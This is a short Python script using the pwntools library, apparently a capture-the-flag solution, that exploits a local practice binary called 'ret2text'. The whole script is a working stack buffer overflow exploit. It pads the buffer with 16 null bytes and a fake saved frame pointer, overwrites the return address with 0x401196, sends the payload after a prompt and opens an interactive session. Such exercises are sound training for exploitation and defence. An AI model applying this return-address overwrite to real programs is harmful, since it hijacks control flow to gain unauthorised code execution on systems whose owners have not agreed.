from pwn import*

p = process('./ret2text')

back_addr = 0x401196 
payload = b'\x00'*16 + p64(0)+ p64(back_addr)
p.sendlineafter(";)",payload)

p.interactive()
